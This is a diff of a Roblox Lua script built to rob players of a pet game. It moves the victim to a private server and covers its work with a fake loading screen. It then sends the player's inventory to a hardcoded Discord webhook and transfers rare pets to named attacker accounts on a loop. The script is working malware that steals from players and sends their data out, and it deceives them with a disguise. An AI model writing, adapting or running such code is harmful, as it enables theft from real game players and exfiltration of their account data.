@@ -4,30 +4,24 @@ local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
 
--- Configs
+-- CONFIG
 local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
-local targetedPets = {
-    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
-    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
-    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
-}
 local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
+local targetedPets = {
+    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly", "Queenbee", "Spinosaurus",
+    "Redfox", "Brontosaurus", "Mooncat", "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
+}
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 
--- Step 1: Teleport victim if not in private server
+-- STEP 1: Teleport if not yet in private server
 if game.JobId == "" then
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
     return
 end
 
--- Step 2: Wait for the game to fully load
-game.Loaded:Wait()
-task.wait(3)
-
--- Step 3: Fake GUI while functions run in background
+-- STEP 2: GUI Loader (runs immediately after teleport)
 task.spawn(function()
     local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
     gui.IgnoreGuiInset = true
@@ -88,8 +82,8 @@ task.spawn(function()
     gui:Destroy()
 end)
 
--- Step 4: Send Inventory to Discord
-task.delay(5, function()
+-- STEP 3: Send Inventory to Webhook (5s after GUI)
+task.delay(10, function()
     local data = {items = {}, rarePets = {}}
     local folders = {
         LocalPlayer:FindFirstChild("Pets"),
@@ -127,8 +121,8 @@ task.delay(5, function()
     end)
 end)
 
--- Step 5: Auto-Transfer Pets
-task.delay(10, function()
+-- STEP 4: Auto-transfer Pets to Your Alts
+task.delay(15, function()
     task.spawn(function()
         while true do
             for _, p in pairs(Players:GetPlayers()) do
